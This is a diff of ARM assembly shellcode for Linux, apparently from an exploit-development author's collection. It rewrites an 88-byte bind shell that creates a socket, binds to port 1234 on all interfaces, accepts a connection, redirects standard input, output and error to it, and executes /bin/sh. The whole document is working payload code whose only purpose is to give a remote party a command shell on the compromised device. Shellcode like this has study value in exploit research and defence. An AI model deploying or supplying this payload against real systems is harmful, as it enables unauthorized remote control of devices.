@@ -5,16 +5,13 @@
   http://modexp.wordpress.com/   
 */
 
+// 88 bytes
     .global _start
     .text
 
 _start:
-    .code 32
-    ldr    r4, =#0xD402FF02 // htons(1234), AF_INET
-    ldr    r5, =#0x6e69622f // /bin
-    ldr    r6, =#0x68732f2f // //sh
-    
     // switch to thumb mode
+    .code 32
     add    r3, pc, #1
     bx     r3 
   
@@ -22,36 +19,35 @@ _start:
     // s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
     eor    r2, r2, r2   // r2 = IPPROTO_IP
     mov    r1, #1       // r1 = SOCK_STREAM
-    lsl    r7, r1, #8   // r7 = 1*256
-    add    r7, #25      // r7 = 281 = socket 
     mov    r0, #2       // r0 = AF_INET
+    lsl    r7, r1, #8   // multiply by 256
+    add    r7, #25      // r7 = 256+25 = 281 = socket
     svc    1
     
-    mov    r8, r0       // r8 = s
+    mov    r6, r0       // r6 = s
     
-    // bind(s, &sa, sizeof(sa)); 
-    mov    r1, r4 
-    push   {r1, r2}     // save sa on stack
-    mov    r1, sp       // r1 = &sa
-    strb   r2, [r1, #1] // null the 0xFF in sa.family 
-    mov    r2, #16      // sizeof(sa) 
+    // bind(s, &sa, sizeof(sa));  
+    adr    r1, sa       // r1 = &sa
+    strb   r2, [r1, #1] // zero 0xFF in sa.sin_family
+    str    r2, [r1, #4] // zero sa.sin_addr   
+    mov    r2, #16      // r2 = sizeof(sa)  
     add    r7, #1       // r7 = 281+1 = 282 = bind
     svc    1
   
     // listen(s, 1);
-    mov    r1, #1       // r1 = 1    
-    mov    r0, r8       // r0 = s
+    mov    r1, 1        // r1 = 1    
+    mov    r0, r6
     add    r7, #2       // r7 = 282+2 = 284 = listen 
     svc    1    
     
     // r = accept(s, 0, 0);
     eor    r2, r2, r2   // r2 = 0
     eor    r1, r1, r1   // r1 = 0
-    mov    r0, r8       // r0 = s
+    mov    r0, r6       // r0 = s
     add    r7, #1       // r7 = 284+1 = 285 = accept    
     svc    1    
     
-    mov    r8, r0       // r8 = r
+    mov    r6, r0       // r6 = r
     
     // dup2(r, FILENO_STDIN);
     // dup2(r, FILENO_STDOUT);
@@ -59,15 +55,21 @@ _start:
     mov    r1, #3       // for 3 descriptors
 c_dup:
     mov    r7, #63      // r7 = dup2 
-    mov    r0, r8       // r0 = r
-    sub    r1, #1 
+    mov    r0, r6       // r0 = r
+    sub    r1, #1       // decrease r1
     svc    1
     bne    c_dup        // while (r1 != 0)
 
     // execve("/bin/sh", NULL, NULL);
-    mov    r7, r2 
-    push   {r5, r6, r7}    
-    mov    r0, sp       // r0 = "/bin/sh" 
+    adr    r0, sh       // r0 = "/bin/sh" 
+    strb   r2, [r0, #7] // add null terminator    
     mov    r7, #11      // r7 = execve
     svc    1
-    nop
+sa:    
+    // sa.sin_port   = htons(1234);
+    // sa.sin_family = AF_INET;
+    // sa.sin_addr   = INADDR_ANY;
+    .word  0xD204FF02 
+    .word  0xFFFFFFFF  
+sh:    
+    .ascii "/bin/shX"
